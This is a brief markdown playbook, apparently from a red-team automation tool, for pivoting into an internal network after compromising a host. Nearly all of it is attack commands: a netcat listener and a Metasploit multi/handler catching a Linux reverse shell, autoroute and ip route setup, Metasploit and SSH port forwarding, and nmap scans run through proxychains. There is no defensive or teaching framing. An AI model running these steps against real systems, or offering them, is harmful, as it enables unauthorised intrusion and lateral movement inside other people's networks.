# Chain: Network Pivot

## Trigger: go pivot <target>
## Purpose: Set up pivot point for internal network access

### Steps

1. **Establish Initial Access**
```bash
# Reverse shell listener
nc -lvp 4444
# Or use Metasploit
msfconsole -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST $LAPTOP; run"
```

2. **Enable Routing**
```bash
# Using Metasploit
run autoroute -s 192.168.1.0/24
# Or using ip route
ip route add 192.168.1.0/24 via $TARGET
```

3. **Port Forward**
```bash
# Using Metasploit
 portfwd add -l 3389 -p 3389 -r $TARGET
# Or using ssh
ssh -L 8080:internal:80 user@$TARGET
```

4. **Scan Internal Network**
```bash
# From pivot
nmap -sT -p- 192.168.1.0/24
```

5. **Pivot Tools**
```bash
# Use proxychains
proxychains nmap -sT -p- internal-ip
```

### Tools Used
- Metasploit
- Netcat
- SSH
- ProxyChains

### Output
- Internal network access
- Pivot point established
